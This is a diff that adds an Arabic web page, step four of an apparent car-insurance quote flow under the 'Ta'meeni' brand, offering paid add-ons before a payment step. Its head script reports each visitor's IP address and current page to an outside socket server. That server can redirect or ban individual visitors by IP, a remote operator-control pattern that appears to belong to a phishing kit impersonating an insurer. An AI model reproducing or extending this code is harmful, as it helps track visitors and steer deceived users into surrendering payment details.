@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>تأميني - خطوة 4</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="css/stylee.css">
+  <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+  <script>
+    window.socket = io("https://server-khas.onrender.com", { transports: ["websocket", "polling"] });
+    window.visitorIP = null;
+
+    (async () => {
+      try {
+        const r = await fetch("https://api.ipify.org?format=json");
+        const { ip } = await r.json();
+        window.visitorIP = ip;
+        window.socket.emit("updateLocation", { ip, page: "addons.html" });
+      } catch(e) {
+        console.error("IP fetch failed:", e);
+      }
+    })();
+
+    window.socket.on("navigateTo", ({ page, ip: targetIp }) => {
+      const go = () => { if (window.visitorIP === targetIp) window.location.href = page; };
+      if (!window.visitorIP) {
+        const t = setInterval(() => { if (window.visitorIP) { clearInterval(t); go(); } }, 100);
+      } else { go(); }
+    });
+
+    // تحقق من طلب انتقال معلق عند تحميل الصفحة
+    (async () => {
+      try {
+        while (window.visitorIP === null) {
+          await new Promise(r => setTimeout(r, 50));
+        }
+        const res = await fetch(`https://server-khas.onrender.com/api/pending-nav/${encodeURIComponent(window.visitorIP)}`);
+        const data = await res.json();
+        if (data.page) { window.location.href = data.page; }
+      } catch(e) { console.error("pending-nav check failed:", e); }
+    })();
+
+    // فحص الحظر عند تحميل الصفحة
+    (async () => {
+      try {
+        while (window.visitorIP === null) {
+          await new Promise(r => setTimeout(r, 50));
+        }
+        const res = await fetch(`https://server-khas.onrender.com/api/banned/${encodeURIComponent(window.visitorIP)}`);
+        const data = await res.json();
+        if (data.banned) { window.location.replace("banned.html"); }
+      } catch(e) { console.error("ban check failed:", e); }
+    })();
+
+    // استقبال حظر فوري من السيرفر
+    window.socket.on("banned", () => {
+      window.location.replace("banned.html");
+    });
+  </script>
+</head>
+<body>
+<div class="app">
+<header>
+<div class="logo">
+<div class="logo-icon" style="display:flex;align-items:center;justify-content:center;padding:0;overflow:hidden;"><img alt="تأميني" src="images/logo.png" style="width:100%;height:100%;object-fit:cover;display:block;"/></div>
+<span>تأميني</span>
+</div>
+</header>
+<div class="stepper">
+<div class="step" data-step="1">
+<div class="step-number">1</div>
+<span>البيانات الأساسية</span>
+</div>
+<div class="step" data-step="2">
+<div class="step-number">2</div>
+<span>بيانات التأمين</span>
+</div>
+<div class="step" data-step="3">
+<div class="step-number">3</div>
+<span>قائمة الأسعار</span>
+</div>
+<div class="step active" data-step="4">
+<div class="step-number">4</div>
+<span>الإضافات</span>
+</div>
+<div class="step" data-step="5">
+<div class="step-number">5</div>
+<span>الملخص والدفع</span>
+</div>
+</div>
+<main>
+<form id="formStep4">
+<h2>الإضافات على الوثيقة</h2>
+<p class="agreement">اختر الإضافات التي ترغب بها (اختياري).</p>
+<div class="addons">
+<label class="addon-item">
+<input data-name="مساعدة على الطريق" data-price="75" type="checkbox"/>
+<span class="addon-label">مساعدة على الطريق</span>
+<span class="addon-price">+ ٧٥ ريال</span>
+</label>
+<label class="addon-item">
+<input data-name="إصلاح لدى الوكيل" data-price="150" type="checkbox"/>
+<span class="addon-label">إصلاح لدى الوكيل</span>
+<span class="addon-price">+ ١٥٠ ريال</span>
+</label>
+<label class="addon-item">
+<input data-name="سيارة بديلة أثناء الإصلاح" data-price="120" type="checkbox"/>
+<span class="addon-label">سيارة بديلة أثناء الإصلاح</span>
+<span class="addon-price">+ ١٢٠ ريال</span>
+</label>
+<label class="addon-item">
+<input data-name="تغطية زجاج المركبة" data-price="50" type="checkbox"/>
+<span class="addon-label">تغطية زجاج المركبة</span>
+<span class="addon-price">+ ٥٠ ريال</span>
+</label>
+</div>
+<div class="buttons-row">
+<a class='btn btn-secondary' href='insurance.html'>السابق</a>
+</div>
+<button style="display:block;width:100%;margin:24px 0;padding:14px;font-size:18px;background:#0d6efd;color:#fff;border:none;border-radius:8px;" type="submit">التالي</button></form>
+</main>
+</div>
+<script src="js/c8a3.js"></script>
+<script src="js/kn5k.js"></script>
+<div class="loading-screen" id="loadingScreen">
+<div class="loading-content">
+<div class="loading-dots">
+<div></div>
+<div></div>
+<div></div>
+<div></div>
+</div>
+<div class="loading-text" id="loadingText">جاري التحميل...</div>
+<div class="loading-subtext" id="loadingSubtext">يرجى الانتظار</div>
+</div>
+</div>
+
+</body>
+</html>
